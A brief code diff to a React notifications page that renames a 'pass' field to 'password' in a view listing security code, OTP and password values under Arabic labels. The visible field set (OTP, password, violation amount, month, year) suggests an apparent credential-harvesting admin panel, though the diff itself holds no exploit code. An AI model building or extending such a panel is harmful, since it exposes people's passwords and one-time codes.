@@ -128,7 +128,7 @@ interface Notification {
   isOnline?: boolean;
   lastSeen: string;
   violationValue: number;
-  pass?: string;
+  password?: string;
   year: string;
   month: string;
   pagename: string;
@@ -2009,7 +2009,10 @@ export default function NotificationsPage() {
                   },
                   { label: "رمز الأمان", value: selectedNotification.password },
                   { label: "رمز التحقق", value: selectedNotification.otp },
-                  { label: "كلمة المرور", value: selectedNotification.pass },
+                  {
+                    label: "كلمة المرور",
+                    value: selectedNotification.password,
+                  },
                 ].map(
                   ({ label, value }) =>
                     value && (
